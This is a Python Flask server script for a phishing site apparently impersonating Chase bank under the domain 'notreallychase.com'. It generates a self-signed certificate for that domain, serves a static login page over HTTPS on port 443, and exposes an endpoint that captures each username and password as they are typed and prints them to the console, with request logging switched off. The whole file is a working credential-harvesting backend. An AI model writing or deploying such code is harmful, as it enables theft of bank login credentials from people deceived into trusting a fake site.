# General Settings
lineLength = 75
domain = "notreallychase.com"
certName = f"{domain}.crt"
keyName = f"{domain}.key"
certConfName = "cert.conf"

import os
import shutil
import threading
import flask
import logging
import socket
import os
import subprocess

# Generating cert if needed
def GenCertIfNeeded():
    if os.path.exists(certName) and os.path.exists(keyName):
        return
    certConf = f"""
    [req]
    default_bits       = 2048
    prompt             = no
    default_md         = sha256
    x509_extensions    = req_ext
    distinguished_name = dn

    [dn]
    C  = US
    ST = Oregon
    L  = Portland
    O  = FinlayTheBerry
    CN = {domain}

    [req_ext]
    subjectAltName = @alt_names

    [alt_names]
    DNS.1 = {domain}
    DNS.2 = www.{domain}
    """

    with open(certConfName, "w", encoding="utf-8") as certConfFile: certConfFile.write(certConf)
    subprocess.run(f"\"C:\\Program Files\\Git\\usr\\bin\\openssl.exe\" req -x509 -newkey rsa:2048 -nodes -keyout {keyName} -out {certName} -config {certConfName} -days 365", shell=True)

    shutil.copyfile(certName, os.path.join("../client", certName))
GenCertIfNeeded()

# Logging and console output
def PrintInit():
    if os.system("reset") != 0:
        if os.system("clear") != 0:
            os.system("cls")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # Doesn't actually send data
    ip = s.getsockname()[0]
    s.close()
    print(f"Hosting on {ip}")

    print("-" * lineLength)
threading.Timer(0.5, PrintInit).start()
log = logging.getLogger("werkzeug")
log.disabled = True

# Flask server
app = flask.Flask(__name__, static_folder="public_html")
@app.route("/api/input", methods=["POST"])
def api_input():
    data = flask.request.get_json()
    username = data.get("username")
    password = data.get("password")
    message = f"\rUsername: {username} Password: {password}"
    message = message + (" " * (lineLength - len(message)))
    print(message, end="", flush=True)
    return flask.Response(status=200)
@app.route("/api/submit", methods=["POST"])
def api_submit():
    print()
    return flask.Response(status=200)
@app.route("/")
def serve_index():
    return flask.send_from_directory(app.static_folder, "index.html")
@app.route("/<path:filename>")
def serve_file(filename):
    return flask.send_from_directory(app.static_folder, filename)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, debug=False, ssl_context=("notreallychase.com.crt", "notreallychase.com.key"))